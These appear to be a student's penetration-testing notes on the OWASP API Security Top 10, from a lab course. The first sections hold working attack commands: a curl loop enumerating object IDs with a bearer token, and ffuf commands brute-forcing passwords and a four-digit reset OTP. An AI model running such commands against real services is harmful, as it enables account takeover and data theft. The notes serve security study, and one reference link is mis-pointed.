# API Attacks

[OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)

## Broken Object Level Authorization

- [API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- The API allows authenticated users to access data they are not authorized to view

- Authenticate as one user
- Find what is accessible for their role
- Change the parameter (IDOR)
- Automate the process:
```bash
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.59.242:35144/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2NjEzNjk5MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.tM-yNdndwsWlMm4OzUgUE_tldLIa9ehL-usX5PDqyXCW3En3mCV0YjKWkYnEBsGyMe0JQphQxnlGgt6gHDzGig' | jq

## Broken Authentication

- [API2:2023](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access

- Authenticate as one user
- Find what is accessible for their role
- Try changing password to "pass" and inspect error message to see if allows weak passwords
- If weak passwords are allowed can try fuzzing passwords for known users
- try an incorrect password to get error message
- fuzz passwords with ffuf
```bash
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.120.112:34036/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
- fuzz OTP for password reset
```bash
ffuf -w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://94.237.120.112:34036/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "password"}' -fr "false" -t 100
```

## Broken Object Property Level Authorization

- [API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- The API reveals sensitive data to authorized users that they should not access or permits them to manipulate sensitive properties

### Exposure of Sensitive Information Due to Incompatible Policies

- Authenticate as one user
- Find what is accessible for their role
- Retrieve data to see if excessive data is given beyind what is required for the web app/site function

### Improperly Controlled Modification of Dynamically-Determined Object Attributes

- Authenticate as one user
- Find what is accessible for their role
- See what aditional can be updated/patched beyond what is required for web app/site function

## Unrestricted Resource Consumption

- [API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- The API does not limit the amount of resources users can consume



## Broken Function Level Authorization

- [API5:2023](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- The API allows unauthorized users to perform authorized operations



## Unrestricted Access to Sensitive Business Flows

- [API6:2023](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- The API exposes sensitive business flows, leading to potential financial losses and other damages



## Server Side Request Forgery

- [API7:2023](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- The API does not validate requests adequately, allowing attackers to send malicious requests and interact with internal resources



## Security Misconfiguration

- [API8:2023](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- The API suffers from security misconfigurations, including vulnerabilities that lead to Injection Attacks



## Improper Inventory Management

- [API9:2023](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- The API does not properly and securely manage version inventory



## Unsafe Consumption of APIs

- [API10:2023](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- The API consumes another API unsafely, leading to potential security risks
